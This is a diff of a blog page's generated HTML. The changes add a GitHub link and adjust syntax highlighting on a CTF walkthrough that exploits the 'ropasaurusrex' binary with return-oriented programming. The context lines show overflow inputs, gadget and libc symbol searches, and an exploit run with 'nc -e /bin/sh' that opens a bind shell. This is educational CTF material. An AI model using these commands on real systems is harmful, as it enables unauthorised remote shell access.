@@ -86,6 +86,15 @@
 </ul>
   
   
+  
+  
+  
+<ul class="subscription">
+  <li><a href="https://github.com/yous" rel="subscribe-github" title="@yous on GitHub">GitHub</a></li>
+</ul>
+  
+  
+  
 <form action="http://google.com/search" method="get">
   <fieldset role="search">
     <input type="hidden" name="q" value="site:yous.be" />
@@ -401,7 +410,7 @@
 <span class='line-number'>7</span>
 <span class='line-number'>8</span>
 </pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span><span class="nb">ulimit</span> -c unlimited
-</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x300&quot;</span> | ./ropasaurusrex
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x300&quot;</span> <span class="p">|</span> ./ropasaurusrex
 </span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
 </span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
 </span><span class='line'><span class="o">[</span>...<span class="o">]</span>
@@ -419,7 +428,7 @@
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x140;print &#39;BBBB&#39;&quot;</span> | ./ropasaurusrex
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s2">&quot;print &#39;A&#39;x140;print &#39;BBBB&#39;&quot;</span> <span class="p">|</span> ./ropasaurusrex
 </span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
 </span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
 </span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
@@ -434,7 +443,7 @@
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="k">while </span><span class="nb">true</span>; <span class="k">do </span>nc -vv -l -p 4444 -e ./ropasaurusrex; <span class="k">done</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span><span class="k">while </span><span class="nb">true</span><span class="p">;</span> <span class="k">do </span>nc -vv -l -p 4444 -e ./ropasaurusrex<span class="p">;</span> <span class="k">done</span>
 </span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> 4444 ...
 </span></code></pre></td></tr></table></div></figure>
 
@@ -534,7 +543,7 @@
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>objdump -x ropasaurusrex  | grep -A1 <span class="s1">&#39;\.data&#39;</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>objdump -x ropasaurusrex  <span class="p">|</span> grep -A1 <span class="s1">&#39;\.data&#39;</span>
 </span><span class='line'> 23 .data         00000008  08049620  08049620  00000620  2**2
 </span><span class='line'>                   CONTENTS, ALLOC, LOAD, DATA
 </span></code></pre></td></tr></table></div></figure>
@@ -756,7 +765,7 @@
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -T /lib/i686/cmov/libc.so.6 | grep system
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -T /lib/i686/cmov/libc.so.6 <span class="p">|</span> grep system
 </span><span class='line'>000f5470 g    DF .text  00000042  GLIBC_2.0   svcerr_systemerr
 </span><span class='line'>00039450 g    DF .text  0000007d  GLIBC_PRIVATE __libc_system
 </span><span class='line'>00039450  w   DF .text  0000007d  GLIBC_2.0   system
@@ -1093,7 +1102,7 @@
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
 <span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -d ./ropasaurusrex | egrep <span class="s1">&#39;pop|ret&#39;</span>
+</pre></td><td class='code'><pre><code class='sh'><span class='line'><span class="nv">$ </span>objdump -d ./ropasaurusrex <span class="p">|</span> egrep <span class="s1">&#39;pop|ret&#39;</span>
 </span><span class='line'><span class="o">[</span>...<span class="o">]</span>
 </span><span class='line'> 80484b5:       5b                      pop    ebx
 </span><span class='line'> 80484b6:       5e                      pop    esi
@@ -1321,7 +1330,7 @@
 <span class='line-number'>13</span>
 <span class='line-number'>14</span>
 <span class='line-number'>15</span>
-</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> | ./ropasaurusrex
+</pre></td><td class='code'><pre><code class='sh'><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> <span class="p">|</span> ./ropasaurusrex
 </span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
 </span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
 </span><span class='line'>Program terminated with signal 11, Segmentation fault.
@@ -1329,7 +1338,7 @@
 </span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/x system
 </span><span class='line'>0xb766e450 &lt;system&gt;:    0x890cec83
 </span><span class='line'>
-</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> | ./ropasaurusrex
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>perl -e <span class="s1">&#39;printf &quot;A&quot;x1000&#39;</span> <span class="p">|</span> ./ropasaurusrex
 </span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
 </span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>gdb ./ropasaurusrex core
 </span><span class='line'>Program terminated with signal 11, Segmentation fault.
@@ -1778,7 +1787,7 @@
 </span><span class='line'>/home/ron
 </span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;whoami&quot;</span>
 </span><span class='line'>ron
-</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;nc -vv -l -p 5555 -e /bin/sh&quot;</span> &amp;
+</span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>ruby sploit.rb <span class="s2">&quot;nc -vv -l -p 5555 -e /bin/sh&quot;</span> <span class="p">&amp;</span>
 </span><span class='line'><span class="o">[</span>1<span class="o">]</span> 3015
 </span><span class='line'>ron@debian-x86 ~ <span class="nv">$ </span>nc -vv localhost 5555
 </span><span class='line'>debian-x86.skullseclabs.org <span class="o">[</span>127.0.0.1<span class="o">]</span> 5555 <span class="o">(</span>?<span class="o">)</span> open
